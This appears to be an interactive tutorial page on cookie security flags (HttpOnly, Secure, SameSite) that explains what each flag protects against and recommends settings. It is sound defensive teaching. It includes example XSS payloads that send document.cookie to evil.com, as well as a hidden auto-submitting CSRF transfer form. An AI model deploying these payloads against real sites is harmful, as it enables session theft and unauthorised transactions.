1 What Are Cookie Flags?

Cookie flags are directives you set on Set-Cookie headers that tell the browser how to handle the cookie. They are your first line of defense against session theft, XSS, and CSRF.

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

A well-protected cookie. Click the flags below to understand each one.

3 HttpOnly · Deep Dive

▶ What it does

When set, document.cookie in JavaScript returns empty for that cookie. The browser still sends it with HTTP requests — JS just can't read it.

// Cookie: session=abc; HttpOnly console.log(document.cookie); // Output: "" (empty!) // HttpOnly cookie is invisible to JS
✓ Prevents XSS-based cookie theft. Even if an attacker injects <script>document.location='evil.com?c='+document.cookie</script>, the cookie is not in the output.

⚠ What it does NOT do

❌ Does not prevent CSRF (cookie still sent)
❌ Does not encrypt the cookie
❌ Does not prevent MITM (use Secure + HTTPS)
❌ Does not prevent XSS itself (just limits damage)
Try it: Right-click → Inspect → Console, type document.cookie. If the site uses HttpOnly, you see nothing!

4 Secure · Deep Dive

▶ What it does

The browser will only send a Secure cookie over HTTPS. On HTTP, the cookie is not included in requests. This prevents network sniffing (MITM).

// Cookie: session=abc; Secure // HTTPS request: Cookie: session=abc ✓ Sent // HTTP request: // Cookie NOT sent (browser refuses)
⚠ Important: Secure does NOT encrypt the cookie value. The cookie value is still readable in the browser. It just requires HTTPS for transmission.

⚠ What happens without Secure

💻 Browser
→
🕵 MITM / Sniffer
→
Cookie sent in plaintext over HTTP
Cookie stolen!
Real scenario: User on public WiFi (coffee shop). Attacker on same network sniffs HTTP traffic. Without Secure flag, session cookie is visible in plain text.
5 SameSite · Deep Dive

▶ The Three Values

SameSite=Strict

🛡

Cookie never sent cross-site. Most secure but breaks some UX (social login links).

SameSite=Lax

🔒

Sent for top-level GET navigations (links). Not sent for POST/CORS/fetch. Good default.

SameSite=None

🌐

Cookie sent with all cross-site requests. Requires Secure. Vulnerable to CSRF if unchecked.

6 Flag Comparison
FlagWhat it preventsWhat it does NOT preventRecommendation
HttpOnly XSS-based cookie theft (via JS) CSRF, MITM, XSS execution Always ON
Secure MITM sniffing on HTTP XSS, CSRF, server-side attacks Always ON
SameSite=Strict CSRF (all cross-site requests) XSS, MITM Preferred (UX tradeoff)
SameSite=Lax CSRF on state-changing requests Cross-site GET (links still work) Good default
Domain Cookie scope creep (subdomain isolation) XSS, CSRF on same domain Set explicitly
Path Cookie sent to wrong paths (limited) Most attacks (easily bypassed) Optional
Max-Age / Expires Stale cookie reuse (limited window) Active session attacks Set reasonable TTL
7 Attack Scenarios

😈 Scenario: Attacker steals cookie via XSS

// Injected by attacker on a forum: <script> fetch('https://evil.com/steal?c=' + document.cookie); </script>
Vanilla cookie (no HttpOnly):
document.cookie = "session=abc123; token=eyJ..."
✗ Stolen! Sent to evil.com
With HttpOnly:
document.cookie = ""
✓ Empty! Attacker gets nothing

😈 Scenario: Attacker performs CSRF via hidden form

// Hidden on evil.com — auto-submits on page load: <form action="https://bank.com/transfer" method="POST"> <input name="to" value="attacker" /> <input name="amount" value="1000" /> </form> <script>document.forms[0].submit();</script>
Without SameSite:
Cookie auto-sent with cross-site POST request.
✗ Transfer executed!
With SameSite=Strict/Lax:
Cookie NOT sent with cross-site POST request.
✓ Server sees no auth — rejects!
8 Best Practices

✓ Recommended

Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
  • Always set HttpOnly (unless JS needs cookie access)
  • Always set Secure (HTTPS only)
  • Set SameSite=Lax as default
  • Use SameSite=Strict for sensitive actions
  • Set reasonable Max-Age (session vs persistent)
  • Use __Secure- and __Host- cookie name prefixes

✗ Avoid

Set-Cookie: session=abc; SameSite=None // Missing Secure! Browser rejects
  • Setting SameSite=None without understanding CSRF risk
  • Omitting Secure with SameSite=None (browser rejects)
  • Omitting HttpOnly for session cookies
  • Using Domain= too broadly (e.g., .com)
  • Setting Max-Age years into the future
  • Storing secrets (tokens) without HttpOnly protection
